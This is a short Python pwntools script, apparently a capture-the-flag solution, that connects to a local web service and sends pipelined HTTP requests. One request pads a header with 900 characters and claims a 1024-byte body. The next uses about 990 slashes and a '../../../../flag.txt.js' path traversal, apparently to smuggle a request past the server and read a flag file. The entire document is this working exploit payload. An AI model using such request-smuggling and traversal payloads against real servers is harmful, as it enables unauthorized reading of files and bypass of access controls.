from pwn import *

conn = remote('localhost', 8081)

conn.send(f"GET /index.html HTTP/1.1\r\nHost: localhost:80\r\nContent-Length: 1024\r\nX: {'A'*900}\r\n\r\nGET /images{'/'*990}../../../../flag.txt.js HTTP/1.1\r\n\r\nGET / HTTP/1.1\r\nHost: localhost:80\r\n\r\n".encode())
print(conn.recv())
conn.interactive()